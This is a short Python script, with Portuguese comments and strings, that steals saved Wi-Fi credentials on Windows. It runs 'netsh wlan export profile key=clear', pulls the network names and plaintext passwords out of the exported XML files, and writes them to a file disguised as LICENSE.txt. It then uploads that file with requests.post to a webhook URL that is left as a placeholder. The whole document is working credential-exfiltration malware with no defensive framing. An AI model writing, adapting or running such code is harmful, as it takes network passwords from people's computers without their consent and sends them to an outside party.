import subprocess
import os
import sys
import requests

url = 'seu_webhook_aqui'

password_file = open('LICENSE.txt', "w")
password_file.write("Fala meu chapa! Aqui suas senhas:\n\n")
password_file.close()

wifi_files = []
wifi_name = []
wifi_password = []

command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode('utf-8', 'ignore')

path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open ("LICENSE.txt", "a")
                            print("SSID: "+x, "Senha: "+y, sep='\n')
                            sys.stdout.close()

with open('LICENSE.txt', 'rb') as f:
    r = requests.post(url, data=f)